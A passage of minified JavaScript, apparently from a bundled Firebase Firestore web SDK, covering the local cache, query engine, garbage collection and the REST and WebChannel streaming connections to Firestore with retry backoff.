this.ri.forEach(((o,r)=>t(r))),ce.resolve()}getLastRemoteSnapshotVersion(e){return ce.resolve(this.lastRemoteSnapshotVersion)}getHighestSequenceNumber(e){return ce.resolve(this.ii)}allocateTargetId(e){return this.highestTargetId=this.oi.next(),ce.resolve(this.highestTargetId)}setTargetsMetadata(e,t,o){return o&&(this.lastRemoteSnapshotVersion=o),t>this.ii&&(this.ii=t),ce.resolve()}lr(e){this.ri.set(e.target,e);const t=e.targetId;t>this.highestTargetId&&(this.oi=new rl(t),this.highestTargetId=t),e.sequenceNumber>this.ii&&(this.ii=e.sequenceNumber)}addTargetData(e,t){return this.lr(t),this.targetCount+=1,ce.resolve()}updateTargetData(e,t){return this.lr(t),ce.resolve()}removeTargetData(e,t){return this.ri.delete(t.target),this.si.Gr(t.targetId),this.targetCount-=1,ce.resolve()}removeTargets(e,t,o){let r=0;const l=[];return this.ri.forEach(((c,d)=>{d.sequenceNumber<=t&&o.get(d.targetId)===null&&(this.ri.delete(c),l.push(this.removeMatchingKeysForTargetId(e,d.targetId)),r++)})),ce.waitFor(l).next((()=>r))}getTargetCount(e){return ce.resolve(this.targetCount)}getTargetData(e,t){const o=this.ri.get(t)||null;return ce.resolve(o)}addMatchingKeys(e,t,o){return this.si.$r(t,o),ce.resolve()}removeMatchingKeys(e,t,o){this.si.Qr(t,o);const r=this.persistence.referenceDelegate,l=[];return r&&t.forEach((c=>{l.push(r.markPotentiallyOrphaned(e,c))})),ce.waitFor(l)}removeMatchingKeysForTargetId(e,t){return this.si.Gr(t),ce.resolve()}getMatchingKeysForTargetId(e,t){const o=this.si.jr(t);return ce.resolve(o)}containsKey(e,t){return ce.resolve(this.si.containsKey(t))}}class e0{constructor(e,t){this._i={},this.overlays={},this.ai=new em(0),this.ui=!1,this.ui=!0,this.ci=new AI,this.referenceDelegate=e(this),this.li=new PI(this),this.indexManager=new dI,this.remoteDocumentCache=(function(r){return new xI(r)})((o=>this.referenceDelegate.hi(o))),this.serializer=new cI(t),this.Pi=new SI(this.serializer)}start(){return Promise.resolve()}shutdown(){return this.ui=!1,Promise.resolve()}get started(){return this.ui}setDatabaseDeletedListener(){}setNetworkEnabled(){}getIndexManager(e){return this.indexManager}getDocumentOverlayCache(e){let t=this.overlays[e.toKey()];return t||(t=new CI,this.overlays[e.toKey()]=t),t}getMutationQueue(e,t){let o=this._i[e.toKey()];return o||(o=new TI(t,this.referenceDelegate),this._i[e.toKey()]=o),o}getGlobalsCache(){return this.ci}getTargetCache(){return this.li}getRemoteDocumentCache(){return this.remoteDocumentCache}getBundleCache(){return this.Pi}runTransaction(e,t,o){Ee("MemoryPersistence","Starting transaction:",e);const r=new qI(this.ai.next());return this.referenceDelegate.Ti(),o(r).next((l=>this.referenceDelegate.Ii(r).next((()=>l)))).toPromise().then((l=>(r.raiseOnCommittedEvent(),l)))}Ei(e,t){return ce.or(Object.values(this._i).map((o=>()=>o.containsKey(e,t))))}}class qI extends ZL{constructor(e){super(),this.currentSequenceNumber=e}}class bb{constructor(e){this.persistence=e,this.Ri=new gb,this.Ai=null}static Vi(e){return new bb(e)}get di(){if(this.Ai)return this.Ai;throw we(60996)}addReference(e,t,o){return this.Ri.addReference(o,t),this.di.delete(o.toString()),ce.resolve()}removeReference(e,t,o){return this.Ri.removeReference(o,t),this.di.add(o.toString()),ce.resolve()}markPotentiallyOrphaned(e,t){return this.di.add(t.toString()),ce.resolve()}removeTarget(e,t){this.Ri.Gr(t.targetId).forEach((r=>this.di.add(r.toString())));const o=this.persistence.getTargetCache();return o.getMatchingKeysForTargetId(e,t.targetId).next((r=>{r.forEach((l=>this.di.add(l.toString())))})).next((()=>o.removeTargetData(e,t)))}Ti(){this.Ai=new Set}Ii(e){const t=this.persistence.getRemoteDocumentCache().newChangeBuffer();return ce.forEach(this.di,(o=>{const r=Le.fromPath(o);return this.mi(e,r).next((l=>{l||t.removeEntry(r,_e.min())}))})).next((()=>(this.Ai=null,t.apply(e))))}updateLimboDocument(e,t){return this.mi(e,t).next((o=>{o?this.di.delete(t.toString()):this.di.add(t.toString())}))}hi(e){return 0}mi(e,t){return ce.or([()=>ce.resolve(this.Ri.containsKey(t)),()=>this.persistence.getTargetCache().containsKey(e,t),()=>this.persistence.Ei(e,t)])}}class Mp{constructor(e,t){this.persistence=e,this.fi=new Xr((o=>t2(o.path)),((o,r)=>o.isEqual(r))),this.garbageCollector=bI(this,t)}static Vi(e,t){return new Mp(e,t)}Ti(){}Ii(e){return ce.resolve()}forEachTarget(e,t){return this.persistence.getTargetCache().forEachTarget(e,t)}dr(e){const t=this.pr(e);return this.persistence.getTargetCache().getTargetCount(e).next((o=>t.next((r=>o+r))))}pr(e){let t=0;return this.mr(e,(o=>{t++})).next((()=>t))}mr(e,t){return ce.forEach(this.fi,((o,r)=>this.wr(e,o,r).next((l=>l?ce.resolve():t(r)))))}removeTargets(e,t,o){return this.persistence.getTargetCache().removeTargets(e,t,o)}removeOrphanedDocuments(e,t){let o=0;const r=this.persistence.getRemoteDocumentCache(),l=r.newChangeBuffer();return r.ni(e,(c=>this.wr(e,c,t).next((d=>{d||(o++,l.removeEntry(c,_e.min()))})))).next((()=>l.apply(e))).next((()=>o))}markPotentiallyOrphaned(e,t){return this.fi.set(t,e.currentSequenceNumber),ce.resolve()}removeTarget(e,t){const o=t.withSequenceNumber(e.currentSequenceNumber);return this.persistence.getTargetCache().updateTargetData(e,o)}addReference(e,t,o){return this.fi.set(o,e.currentSequenceNumber),ce.resolve()}removeReference(e,t,o){return this.fi.set(o,e.currentSequenceNumber),ce.resolve()}updateLimboDocument(e,t){return this.fi.set(t,e.currentSequenceNumber),ce.resolve()}hi(e){let t=e.key.toString().length;return e.isFoundDocument()&&(t+=dp(e.data.value)),t}wr(e,t,o){return ce.or([()=>this.persistence.Ei(e,t),()=>this.persistence.getTargetCache().containsKey(e,t),()=>{const r=this.fi.get(t);return ce.resolve(r!==void 0&&r>o)}])}getCacheSize(e){return this.persistence.getRemoteDocumentCache().getSize(e)}}class vb{constructor(e,t,o,r){this.targetId=e,this.fromCache=t,this.Ts=o,this.Is=r}static Es(e,t){let o=Xe(),r=Xe();for(const l of t.docChanges)switch(l.type){case 0:o=o.add(l.doc.key);break;case 1:r=r.add(l.doc.key)}return new vb(e,t.fromCache,o,r)}}class RI{constructor(){this._documentReadCount=0}get documentReadCount(){return this._documentReadCount}incrementDocumentReadCount(e){this._documentReadCount+=e}}class LI{constructor(){this.Rs=!1,this.As=!1,this.Vs=100,this.ds=(function(){return vR()?8:e2(Ct())>0?6:4})()}initialize(e,t){this.fs=e,this.indexManager=t,this.Rs=!0}getDocumentsMatchingQuery(e,t,o,r){const l={result:null};return this.gs(e,t).next((c=>{l.result=c})).next((()=>{if(!l.result)return this.ps(e,t,r,o).next((c=>{l.result=c}))})).next((()=>{if(l.result)return;const c=new RI;return this.ys(e,t,c).next((d=>{if(l.result=d,this.As)return this.ws(e,t,c,d.size)}))})).next((()=>l.result))}ws(e,t,o,r){return o.documentReadCount<this.Vs?(Hs()<=$e.DEBUG&&Ee("QueryEngine","SDK will not create cache indexes for query:",Gs(t),"since it only creates cache indexes for collection contains","more than or equal to",this.Vs,"documents"),ce.resolve()):(Hs()<=$e.DEBUG&&Ee("QueryEngine","Query:",Gs(t),"scans",o.documentReadCount,"local documents and returns",r,"documents as results."),o.documentReadCount>this.ds*r?(Hs()<=$e.DEBUG&&Ee("QueryEngine","The SDK decides to create cache indexes for query:",Gs(t),"as using cache indexes may help improve performance."),this.indexManager.createTargetIndexes(e,go(t))):ce.resolve())}gs(e,t){if(zC(t))return ce.resolve(null);let o=go(t);return this.indexManager.getIndexType(e,o).next((r=>r===0?null:(t.limit!==null&&r===1&&(t=Cg(t,null,"F"),o=go(t)),this.indexManager.getDocumentsMatchingTarget(e,o).next((l=>{const c=Xe(...l);return this.fs.getDocuments(e,c).next((d=>this.indexManager.getMinOffset(e,o).next((f=>{const p=this.bs(t,d);return this.Ss(t,p,c,f.readTime)?this.gs(e,Cg(t,null,"F")):this.Ds(e,p,t,f)}))))})))))}ps(e,t,o,r){return zC(t)||r.isEqual(_e.min())?ce.resolve(null):this.fs.getDocuments(e,o).next((l=>{const c=this.bs(t,l);return this.Ss(t,c,o,r)?ce.resolve(null):(Hs()<=$e.DEBUG&&Ee("QueryEngine","Re-using previous result from %s to execute query: %s",r.toString(),Gs(t)),this.Ds(e,c,t,KL(r,$c)).next((d=>d)))}))}bs(e,t){let o=new at(LT(e));return t.forEach(((r,l)=>{rm(e,l)&&(o=o.add(l))})),o}Ss(e,t,o,r){if(e.limit===null)return!1;if(o.size!==t.size)return!0;const l=e.limitType==="F"?t.last():t.first();return!!l&&(l.hasPendingWrites||l.version.compareTo(r)>0)}ys(e,t,o){return Hs()<=$e.DEBUG&&Ee("QueryEngine","Using full collection scan to execute query:",Gs(t)),this.fs.getDocumentsMatchingQuery(e,t,Ki.min(),o)}Ds(e,t,o,r){return this.fs.getDocumentsMatchingQuery(e,o,r).next((l=>(t.forEach((c=>{l=l.insert(c.key,c)})),l)))}}const yb="LocalStore",II=3e8;class DI{constructor(e,t,o,r){this.persistence=e,this.Cs=t,this.serializer=r,this.vs=new wa(Ye),this.Fs=new Xr((l=>ub(l)),db),this.Ms=new Map,this.xs=e.getRemoteDocumentCache(),this.li=e.getTargetCache(),this.Pi=e.getBundleCache(),this.Os(o)}Os(e){this.documentOverlayCache=this.persistence.getDocumentOverlayCache(e),this.indexManager=this.persistence.getIndexManager(e),this.mutationQueue=this.persistence.getMutationQueue(e,this.indexManager),this.localDocuments=new EI(this.xs,this.mutationQueue,this.documentOverlayCache,this.indexManager),this.xs.setIndexManager(this.indexManager),this.Cs.initialize(this.localDocuments,this.indexManager)}collectGarbage(e){return this.persistence.runTransaction("Collect garbage","readwrite-primary",(t=>e.collect(t,this.vs)))}}function wI(a,e,t,o){return new DI(a,e,t,o)}async function a0(a,e){const t=Ne(a);return await t.persistence.runTransaction("Handle user change","readonly",(o=>{let r;return t.mutationQueue.getAllMutationBatches(o).next((l=>(r=l,t.Os(e),t.mutationQueue.getAllMutationBatches(o)))).next((l=>{const c=[],d=[];let f=Xe();for(const p of r){c.push(p.batchId);for(const v of p.mutations)f=f.add(v.key)}for(const p of l){d.push(p.batchId);for(const v of p.mutations)f=f.add(v.key)}return t.localDocuments.getDocuments(o,f).next((p=>({Ns:p,removedBatchIds:c,addedBatchIds:d})))}))}))}function MI(a,e){const t=Ne(a);return t.persistence.runTransaction("Acknowledge batch","readwrite-primary",(o=>{const r=e.batch.keys(),l=t.xs.newChangeBuffer({trackRemovals:!0});return(function(d,f,p,v){const y=p.batch,S=y.keys();let A=ce.resolve();return S.forEach((R=>{A=A.next((()=>v.getEntry(f,R))).next((L=>{const x=p.docVersions.get(R);ma(x!==null,48541),L.version.compareTo(x)<0&&(y.applyToRemoteDocument(L,p),L.isValidDocument()&&(L.setReadTime(p.commitVersion),v.addEntry(L)))}))})),A.next((()=>d.mutationQueue.removeMutationBatch(f,y)))})(t,o,e,l).next((()=>l.apply(o))).next((()=>t.mutationQueue.performConsistencyCheck(o))).next((()=>t.documentOverlayCache.removeOverlaysForBatchId(o,r,e.batch.batchId))).next((()=>t.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(o,(function(d){let f=Xe();for(let p=0;p<d.mutationResults.length;++p)d.mutationResults[p].transformResults.length>0&&(f=f.add(d.batch.mutations[p].key));return f})(e)))).next((()=>t.localDocuments.getDocuments(o,r)))}))}function t0(a){const e=Ne(a);return e.persistence.runTransaction("Get last remote snapshot version","readonly",(t=>e.li.getLastRemoteSnapshotVersion(t)))}function _I(a,e){const t=Ne(a),o=e.snapshotVersion;let r=t.vs;return t.persistence.runTransaction("Apply remote event","readwrite-primary",(l=>{const c=t.xs.newChangeBuffer({trackRemovals:!0});r=t.vs;const d=[];e.targetChanges.forEach(((v,y)=>{const S=r.get(y);if(!S)return;d.push(t.li.removeMatchingKeys(l,v.removedDocuments,y).next((()=>t.li.addMatchingKeys(l,v.addedDocuments,y))));let A=S.withSequenceNumber(l.currentSequenceNumber);e.targetMismatches.get(y)!==null?A=A.withResumeToken(ft.EMPTY_BYTE_STRING,_e.min()).withLastLimboFreeSnapshotVersion(_e.min()):v.resumeToken.approximateByteSize()>0&&(A=A.withResumeToken(v.resumeToken,o)),r=r.insert(y,A),(function(L,x,D){return L.resumeToken.approximateByteSize()===0||x.snapshotVersion.toMicroseconds()-L.snapshotVersion.toMicroseconds()>=II?!0:D.addedDocuments.size+D.modifiedDocuments.size+D.removedDocuments.size>0})(S,A,v)&&d.push(t.li.updateTargetData(l,A))}));let f=ei(),p=Xe();if(e.documentUpdates.forEach((v=>{e.resolvedLimboDocuments.has(v)&&d.push(t.persistence.referenceDelegate.updateLimboDocument(l,v))})),d.push(kI(l,c,e.documentUpdates).next((v=>{f=v.Bs,p=v.Ls}))),!o.isEqual(_e.min())){const v=t.li.getLastRemoteSnapshotVersion(l).next((y=>t.li.setTargetsMetadata(l,l.currentSequenceNumber,o)));d.push(v)}return ce.waitFor(d).next((()=>c.apply(l))).next((()=>t.localDocuments.getLocalViewOfDocuments(l,f,p))).next((()=>f))})).then((l=>(t.vs=r,l)))}function kI(a,e,t){let o=Xe(),r=Xe();return t.forEach((l=>o=o.add(l))),e.getEntries(a,o).next((l=>{let c=ei();return t.forEach(((d,f)=>{const p=l.get(d);f.isFoundDocument()!==p.isFoundDocument()&&(r=r.add(d)),f.isNoDocument()&&f.version.isEqual(_e.min())?(e.removeEntry(d,f.readTime),c=c.insert(d,f)):!p.isValidDocument()||f.version.compareTo(p.version)>0||f.version.compareTo(p.version)===0&&p.hasPendingWrites?(e.addEntry(f),c=c.insert(d,f)):Ee(yb,"Ignoring outdated watch update for ",d,". Current version:",p.version," Watch version:",f.version)})),{Bs:c,Ls:r}}))}function NI(a,e){const t=Ne(a);return t.persistence.runTransaction("Get next mutation batch","readonly",(o=>(e===void 0&&(e=sb),t.mutationQueue.getNextMutationBatchAfterBatchId(o,e))))}function OI(a,e){const t=Ne(a);return t.persistence.runTransaction("Allocate target","readwrite",(o=>{let r;return t.li.getTargetData(o,e).next((l=>l?(r=l,ce.resolve(r)):t.li.allocateTargetId(o).next((c=>(r=new Vi(e,c,"TargetPurposeListen",o.currentSequenceNumber),t.li.addTargetData(o,r).next((()=>r)))))))})).then((o=>{const r=t.vs.get(o.targetId);return(r===null||o.snapshotVersion.compareTo(r.snapshotVersion)>0)&&(t.vs=t.vs.insert(o.targetId,o),t.Fs.set(e,o.targetId)),o}))}async function Pg(a,e,t){const o=Ne(a),r=o.vs.get(e),l=t?"readwrite":"readwrite-primary";try{t||await o.persistence.runTransaction("Release target",l,(c=>o.persistence.referenceDelegate.removeTarget(c,r)))}catch(c){if(!ml(c))throw c;Ee(yb,`Failed to update sequence numbers for target ${e}: ${c}`)}o.vs=o.vs.remove(e),o.Fs.delete(r.target)}function XC(a,e,t){const o=Ne(a);let r=_e.min(),l=Xe();return o.persistence.runTransaction("Execute query","readwrite",(c=>(function(f,p,v){const y=Ne(f),S=y.Fs.get(v);return S!==void 0?ce.resolve(y.vs.get(S)):y.li.getTargetData(p,v)})(o,c,go(e)).next((d=>{if(d)return r=d.lastLimboFreeSnapshotVersion,o.li.getMatchingKeysForTargetId(c,d.targetId).next((f=>{l=f}))})).next((()=>o.Cs.getDocumentsMatchingQuery(c,e,t?r:_e.min(),t?l:Xe()))).next((d=>(zI(o,T2(e),d),{documents:d,ks:l})))))}function zI(a,e,t){let o=a.Ms.get(e)||_e.min();t.forEach(((r,l)=>{l.readTime.compareTo(o)>0&&(o=l.readTime)})),a.Ms.set(e,o)}class ZC{constructor(){this.activeTargetIds=L2()}Qs(e){this.activeTargetIds=this.activeTargetIds.add(e)}Gs(e){this.activeTargetIds=this.activeTargetIds.delete(e)}Ws(){const e={activeTargetIds:this.activeTargetIds.toArray(),updateTimeMs:Date.now()};return JSON.stringify(e)}}class UI{constructor(){this.vo=new ZC,this.Fo={},this.onlineStateHandler=null,this.sequenceNumberHandler=null}addPendingMutation(e){}updateMutationState(e,t,o){}addLocalQueryTarget(e,t=!0){return t&&this.vo.Qs(e),this.Fo[e]||"not-current"}updateQueryState(e,t,o){this.Fo[e]=t}removeLocalQueryTarget(e){this.vo.Gs(e)}isLocalQueryTarget(e){return this.vo.activeTargetIds.has(e)}clearQueryState(e){delete this.Fo[e]}getAllActiveQueryTargets(){return this.vo.activeTargetIds}isActiveQueryTarget(e){return this.vo.activeTargetIds.has(e)}start(){return this.vo=new ZC,Promise.resolve()}handleUserChange(e,t,o){}setOnlineState(e){}shutdown(){}writeSequenceNumber(e){}notifyBundleLoaded(e){}}class BI{Mo(e){}shutdown(){}}const e1="ConnectivityMonitor";class a1{constructor(){this.xo=()=>this.Oo(),this.No=()=>this.Bo(),this.Lo=[],this.ko()}Mo(e){this.Lo.push(e)}shutdown(){window.removeEventListener("online",this.xo),window.removeEventListener("offline",this.No)}ko(){window.addEventListener("online",this.xo),window.addEventListener("offline",this.No)}Oo(){Ee(e1,"Network connectivity changed: AVAILABLE");for(const e of this.Lo)e(0)}Bo(){Ee(e1,"Network connectivity changed: UNAVAILABLE");for(const e of this.Lo)e(1)}static v(){return typeof window<"u"&&window.addEventListener!==void 0&&window.removeEventListener!==void 0}}let Zd=null;function qg(){return Zd===null?Zd=(function(){return 268435456+Math.round(2147483648*Math.random())})():Zd++,"0x"+Zd.toString(16)}const Mh="RestConnection",VI={BatchGetDocuments:"batchGet",Commit:"commit",RunQuery:"runQuery",RunAggregationQuery:"runAggregationQuery",ExecutePipeline:"executePipeline"};class FI{get Ko(){return!1}constructor(e){this.databaseInfo=e,this.databaseId=e.databaseId;const t=e.ssl?"https":"http",o=encodeURIComponent(this.databaseId.projectId),r=encodeURIComponent(this.databaseId.database);this.qo=t+"://"+e.host,this.Uo=`projects/${o}/databases/${r}`,this.$o=this.databaseId.database===Pp?`project_id=${o}`:`project_id=${o}&database_id=${r}`}Wo(e,t,o,r,l){const c=qg(),d=this.Qo(e,t.toUriEncodedString());Ee(Mh,`Sending RPC '${e}' ${c}:`,d,o);const f={"google-cloud-resource-prefix":this.Uo,"x-goog-request-params":this.$o};this.Go(f,r,l);const{host:p}=new URL(d),v=cl(p);return this.zo(e,d,f,o,v).then((y=>(Ee(Mh,`Received RPC '${e}' ${c}: `,y),y)),(y=>{throw Jr(Mh,`RPC '${e}' ${c} failed with error: `,y,"url: ",d,"request:",o),y}))}jo(e,t,o,r,l,c){return this.Wo(e,t,o,r,l)}Go(e,t,o){e["X-Goog-Api-Client"]=(function(){return"gl-js/ fire/"+dl})(),e["Content-Type"]="text/plain",this.databaseInfo.appId&&(e["X-Firebase-GMPID"]=this.databaseInfo.appId),t&&t.headers.forEach(((r,l)=>e[l]=r)),o&&o.headers.forEach(((r,l)=>e[l]=r))}Qo(e,t){const o=VI[e];let r=`${this.qo}/v1/${t}:${o}`;return this.databaseInfo.apiKey&&(r=`${r}?key=${encodeURIComponent(this.databaseInfo.apiKey)}`),r}terminate(){}}class HI{constructor(e){this.Ho=e.Ho,this.Jo=e.Jo}Zo(e){this.Xo=e}Yo(e){this.e_=e}t_(e){this.n_=e}onMessage(e){this.r_=e}close(){this.Jo()}send(e){this.Ho(e)}i_(){this.Xo()}s_(){this.e_()}o_(e){this.n_(e)}__(e){this.r_(e)}}const vt="WebChannelConnection",Ac=(a,e,t)=>{a.listen(e,(o=>{try{t(o)}catch(r){setTimeout((()=>{throw r}),0)}}))};class Ks extends FI{constructor(e){super(e),this.a_=[],this.forceLongPolling=e.forceLongPolling,this.autoDetectLongPolling=e.autoDetectLongPolling,this.useFetchStreams=e.useFetchStreams,this.longPollingOptions=e.longPollingOptions}static u_(){if(!Ks.c_){const e=lT();Ac(e,sT.STAT_EVENT,(t=>{t.stat===gg.PROXY?Ee(vt,"STAT_EVENT: detected buffering proxy"):t.stat===gg.NOPROXY&&Ee(vt,"STAT_EVENT: detected no buffering proxy")})),Ks.c_=!0}}zo(e,t,o,r,l){const c=qg();return new Promise(((d,f)=>{const p=new iT;p.setWithCredentials(!0),p.listenOnce(rT.COMPLETE,(()=>{try{switch(p.getLastErrorCode()){case up.NO_ERROR:const y=p.getResponseJson();Ee(vt,`XHR for RPC '${e}' ${c} received:`,JSON.stringify(y)),d(y);break;case up.TIMEOUT:Ee(vt,`RPC '${e}' ${c} timed out`),f(new xe(de.DEADLINE_EXCEEDED,"Request time out"));break;case up.HTTP_ERROR:const S=p.getStatus();if(Ee(vt,`RPC '${e}' ${c} failed with status:`,S,"response text:",p.getResponseText()),S>0){let A=p.getResponseJson();Array.isArray(A)&&(A=A[0]);const R=A?.error;if(R&&R.status&&R.message){const L=(function(D){const G=D.toLowerCase().replace(/_/g,"-");return Object.values(de).indexOf(G)>=0?G:de.UNKNOWN})(R.status);f(new xe(L,R.message))}else f(new xe(de.UNKNOWN,"Server responded with status "+p.getStatus()))}else f(new xe(de.UNAVAILABLE,"Connection failed."));break;default:we(9055,{l_:e,streamId:c,h_:p.getLastErrorCode(),P_:p.getLastError()})}}finally{Ee(vt,`RPC '${e}' ${c} completed.`)}}));const v=JSON.stringify(r);Ee(vt,`RPC '${e}' ${c} sending request:`,r),p.send(t,"POST",v,o,15)}))}T_(e,t,o){const r=qg(),l=[this.qo,"/","google.firestore.v1.Firestore","/",e,"/channel"],c=this.createWebChannelTransport(),d={httpSessionIdParam:"gsessionid",initMessageHeaders:{},messageUrlParams:{database:`projects/${this.databaseId.projectId}/databases/${this.databaseId.database}`},sendRawJson:!0,supportsCrossDomainXhr:!0,internalChannelParams:{forwardChannelRequestTimeoutMs:6e5},forceLongPolling:this.forceLongPolling,detectBufferingProxy:this.autoDetectLongPolling},f=this.longPollingOptions.timeoutSeconds;f!==void 0&&(d.longPollingTimeout=Math.round(1e3*f)),this.useFetchStreams&&(d.useFetchStreams=!0),this.Go(d.initMessageHeaders,t,o),d.encodeInitMessageHeaders=!0;const p=l.join("");Ee(vt,`Creating RPC '${e}' stream ${r}: ${p}`,d);const v=c.createWebChannel(p,d);this.I_(v);let y=!1,S=!1;const A=new HI({Ho:R=>{S?Ee(vt,`Not sending because RPC '${e}' stream ${r} is closed:`,R):(y||(Ee(vt,`Opening RPC '${e}' stream ${r} transport.`),v.open(),y=!0),Ee(vt,`RPC '${e}' stream ${r} sending:`,R),v.send(R))},Jo:()=>v.close()});return Ac(v,_c.EventType.OPEN,(()=>{S||(Ee(vt,`RPC '${e}' stream ${r} transport opened.`),A.i_())})),Ac(v,_c.EventType.CLOSE,(()=>{S||(S=!0,Ee(vt,`RPC '${e}' stream ${r} transport closed`),A.o_(),this.E_(v))})),Ac(v,_c.EventType.ERROR,(R=>{S||(S=!0,Jr(vt,`RPC '${e}' stream ${r} transport errored. Name:`,R.name,"Message:",R.message),A.o_(new xe(de.UNAVAILABLE,"The operation could not be completed")))})),Ac(v,_c.EventType.MESSAGE,(R=>{if(!S){const L=R.data[0];ma(!!L,16349);const x=L,D=x?.error||x[0]?.error;if(D){Ee(vt,`RPC '${e}' stream ${r} received error:`,D);const G=D.status;let B=(function(Q){const w=Ka[Q];if(w!==void 0)return VT(w)})(G),ee=D.message;G==="NOT_FOUND"&&ee.includes("database")&&ee.includes("does not exist")&&ee.includes(this.databaseId.database)&&Jr(`Database '${this.databaseId.database}' not found. Please check your project configuration.`),B===void 0&&(B=de.INTERNAL,ee="Unknown error status: "+G+" with message "+D.message),S=!0,A.o_(new xe(B,ee)),v.close()}else Ee(vt,`RPC '${e}' stream ${r} received:`,L),A.__(L)}})),Ks.u_(),setTimeout((()=>{A.s_()}),0),A}terminate(){this.a_.forEach((e=>e.close())),this.a_=[]}I_(e){this.a_.push(e)}E_(e){this.a_=this.a_.filter((t=>t===e))}Go(e,t,o){super.Go(e,t,o),this.databaseInfo.apiKey&&(e["x-goog-api-key"]=this.databaseInfo.apiKey)}createWebChannelTransport(){return cT()}}function GI(a){return new Ks(a)}function _h(){return typeof document<"u"?document:null}function um(a){return new K2(a,!0)}Ks.c_=!1;class n0{constructor(e,t,o=1e3,r=1.5,l=6e4){this.Ci=e,this.timerId=t,this.R_=o,this.A_=r,this.V_=l,this.d_=0,this.m_=null,this.f_=Date.now(),this.reset()}reset(){this.d_=0}g_(){this.d_=this.V_}p_(e){this.cancel();const t=Math.floor(this.d_+this.y_()),o=Math.max(0,Date.now()-this.f_),r=Math.max(0,t-o);r>0&&Ee("ExponentialBackoff",`Backing off for ${r} ms (base delay: ${this.d_} ms, delay with jitter: ${t} ms, last attempt: ${o} ms ago)`),this.m_=this.Ci.enqueueAfterDelay(this.timerId,r,(()=>(this.f_=Date.now(),e()))),this.d_*=this.A_,this.d_<this.R_&&(this.d_=this.R_),this.d_>this.V_&&(this.d_=this.V_)}w_(){this.m_!==null&&(this.m_.skipDelay(),this.m_=null)}cancel(){this.m_!==null&&(this.m_.cancel(),this.m_=null)}y_(){return(Math.random()-.5)*this.d_}}const t1="PersistentStream";class o0{constructor(e,t,o,r,l,c,d,f){this.Ci=e,this.b_=o,this.S_=r,this.connection=l,this.authCredentialsProvider=c,this.appCheckCredentialsProvider=d,this.listener=f,this.state=0,this.D_=0,this.C_=null,this.v_=null,this.stream=null,this.F_=0,this.M_=new n0(e,t)}x_(){return this.state===1||this.state===5||this.O_()}O_(){return this.state===2||this.state===3}start(){this.F_=0,this.state!==4?this.auth():this.N_()}async stop(){this.x_()&&await this.close(0)}B_(){this.state=0,this.M_.reset()}L_(){this.O_()&&this.C_===null&&(this.C_=this.Ci.enqueueAfterDelay(this.b_,6e4,(()=>this.k_())))}K_(e){this.q_(),this.stream.send(e)}async k_(){if(this.O_())return this.close(0)}q_(){this.C_&&(this.C_.cancel(),this.C_=null)}U_(){this.v_&&(this.v_.cancel(),this.v_=null)}async close(e,t){this.q_(),this.U_(),this.M_.cancel(),this.D_++,e!==4?this.M_.reset():t&&t.code===de.RESOURCE_EXHAUSTED?(Zo(t.toString()),Zo("Using maximum backoff delay to prevent overloading the backend."),this.M_.g_()):t&&t.code===de.UNAUTHENTICATED&&this.state!==3&&(this.authCredentialsProvider.invalidateToken(),this.appCheckCredentialsProvider.invalidateToken()),this.stream!==null&&(this.W_(),this.stream.close(),this.stream=null),this.state=e,await this.listener.t_(t)}W_(){}auth(){this.state=1;const e=this.Q_(this.D_),t=this.D_;Promise.all([this.authCredentialsProvider.getToken(),this.appCheckCredentialsProvider.getToken()]).then((([o,r])=>{this.D_===t&&this.G_(o,r)}),(o=>{e((()=>{const r=new xe(de.UNKNOWN,"Fetching auth token failed: "+o.message);return this.z_(r)}))}))}G_(e,t){const o=this.Q_(this.D_);this.stream=this.j_(e,t),this.stream.Zo((()=>{o((()=>this.listener.Zo()))})),this.stream.Yo((()=>{o((()=>(this.state=2,this.v_=this.Ci.enqueueAfterDelay(this.S_,1e4,(()=>(this.O_()&&(this.state=3),Promise.resolve()))),this.listener.Yo())))})),this.stream.t_((r=>{o((()=>this.z_(r)))})),this.stream.onMessage((r=>{o((()=>++this.F_==1?this.H_(r):this.onNext(r)))}))}N_(){this.state=5,this.M_.p_((async()=>{this.state=0,this.start()}))}z_(e){return Ee(t1,`close with error: ${e}`),this.stream=null,this.close(4,e)}Q_(e){return t=>{this.Ci.enqueueAndForget((()=>this.D_===e?t():(Ee(t1,"stream callback skipped by getCloseGuardedDispatcher."),Promise.resolve())))}}}class JI extends o0{constructor(e,t,o,r,l,c){super(e,"listen_stream_connection_backoff","listen_stream_idle","health_check_timeout",t,o,r,c),this.serializer=l}j_(e,t){return this.connection.T_("Listen",e,t)}H_(e){return this.onNext(e)}onNext(e){this.M_.reset();const t=X2(this.serializer,e),o=(function(l){if(!("targetChange"in l))return _e.min();const c=l.targetChange;return c.targetIds&&c.targetIds.length?_e.min():c.readTime?bo(c.readTime):_e.min()})(e);return this.listener.J_(t,o)}Z_(e){const t={};t.database=jg(this.serializer),t.addTarget=(function(l,c){let d;const f=c.target;if(d=Sg(f)?{documents:aI(l,f)}:{query:tI(l,f).ft},d.targetId=c.targetId,c.resumeToken.approximateByteSize()>0){d.resumeToken=GT(l,c.resumeToken);const p=Ag(l,c.expectedCount);p!==null&&(d.expectedCount=p)}else if(c.snapshotVersion.compareTo(_e.min())>0){d.readTime=wp(l,c.snapshotVersion.toTimestamp());const p=Ag(l,c.expectedCount);p!==null&&(d.expectedCount=p)}return d})(this.serializer,e);const o=oI(this.serializer,e);o&&(t.labels=o),this.K_(t)}X_(e){const t={};t.database=jg(this.serializer),t.removeTarget=e,this.K_(t)}}class QI extends o0{constructor(e,t,o,r,l,c){super(e,"write_stream_connection_backoff","write_stream_idle","health_check_timeout",t,o,r,c),this.serializer=l}get Y_(){return this.F_>0}start(){this.lastStreamToken=void 0,super.start()}W_(){this.Y_&&this.ea([])}j_(e,t){return this.connection.T_("Write",e,t)}H_(e){return ma(!!e.streamToken,31322),this.lastStreamToken=e.streamToken,ma(!e.writeResults||e.writeResults.length===0,55816),this.listener.ta()}onNext(e){ma(!!e.streamToken,12678),this.lastStreamToken=e.streamToken,this.M_.reset();const t=eI(e.writeResults,e.commitTime),o=bo(e.commitTime);return this.listener.na(o,t)}ra(){const e={};e.database=jg(this.serializer),this.K_(e)}ea(e){const t={streamToken:this.lastStreamToken,writes:e.map((o=>Z2(this.serializer,o)))};this.K_(t)}}class WI{}class KI extends WI{constructor(e,t,o,r){super(),this.authCredentials=e,this.appCheckCredentials=t,this.connection=o,this.serializer=r,this.ia=!1}sa(){if(this.ia)throw new xe(de.FAILED_PRECONDITION,"The client has already been terminated.")}Wo(e,t,o,r){return 